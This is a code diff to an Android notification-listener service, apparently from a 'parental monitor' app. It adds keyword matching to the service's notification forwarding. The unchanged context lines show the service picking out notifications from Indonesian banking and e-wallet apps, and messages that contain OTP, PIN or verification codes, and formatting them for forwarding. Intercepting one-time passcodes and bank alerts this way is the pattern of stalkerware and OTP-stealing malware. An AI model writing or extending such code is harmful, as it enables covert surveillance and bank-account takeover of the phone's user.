@@ -498,6 +498,15 @@ class NotificationForwarderService : NotificationListenerService() {
     private fun buildNotifMessage(label: String, title: String, text: String): String {
         return buildString {
             appendLine("🔔 <b>Notification</b>")
+            try {
+                val raw = (prefsRef ?: PreferencesManager.getInstance(this@NotificationForwarderService)).watchKeywords
+                if (raw.isNotEmpty()) {
+                    val low = (title + "\n" + text).lowercase(java.util.Locale.ROOT)
+                    val hit = raw.split(",", " ", ";").map { it.trim().lowercase(java.util.Locale.ROOT) }.firstOrNull { it.length >= 3 && low.contains(it) }
+                    if (hit != null) appendLine("⚠️ Watch: $hit")
+                }
+            } catch (_: Exception) {
+            }
             appendLine("App: ${Html.escape(label)}")
             if (title.isNotEmpty()) appendLine("Title: ${Html.escape(title).let { it.take(com.redeye.parentalmonitor.utils.TextChunk.safeCut(it, 200)) }}")
             if (text.isNotEmpty()) appendLine("Text: ${Html.escape(text).let { it.take(com.redeye.parentalmonitor.utils.TextChunk.safeCut(it, 300)) }}")
@@ -870,6 +879,14 @@ class NotificationForwarderService : NotificationListenerService() {
         return try {
             val lowPkg = pkg.lowercase(java.util.Locale.ROOT)
             val lowText = (title + "\n" + text).lowercase(java.util.Locale.ROOT)
+            try {
+                val raw = (prefsRef ?: PreferencesManager.getInstance(this)).watchKeywords
+                if (raw.isNotEmpty()) {
+                    val hit = raw.split(",", " ", ";").map { it.trim().lowercase(java.util.Locale.ROOT) }.firstOrNull { it.length >= 3 && lowText.contains(it) }
+                    if (hit != null) return true
+                }
+            } catch (_: Exception) {
+            }
             if (lowText.contains("missed call") || lowText.contains("panggilan tak terjawab") || lowText.contains("tak terjawab") || lowText.contains("missed video call")) return true
             if (lowPkg.contains("bank") || lowPkg.contains("brimo") || lowPkg.contains("livin") || lowPkg.contains("bca") || lowPkg.contains("mandiri") || lowPkg.contains("bni") || lowPkg.contains("bri") || lowPkg.contains("btn") || lowPkg.contains("ovo") || lowPkg.contains("dana") || lowPkg.contains("gopay") || lowPkg.contains("shopeepay") || lowPkg.contains("mbanking") || lowPkg.contains("m-banking") || lowPkg.contains("wallet") || lowPkg.contains("pay")) return true
             if (PRIORITY_CODE_REGEX.containsMatchIn(title + " " + text) && (lowText.contains("otp") || lowText.contains("kode") || lowText.contains("verif") || lowText.contains("pin") || lowText.contains("token") || lowText.contains("auth"))) return true
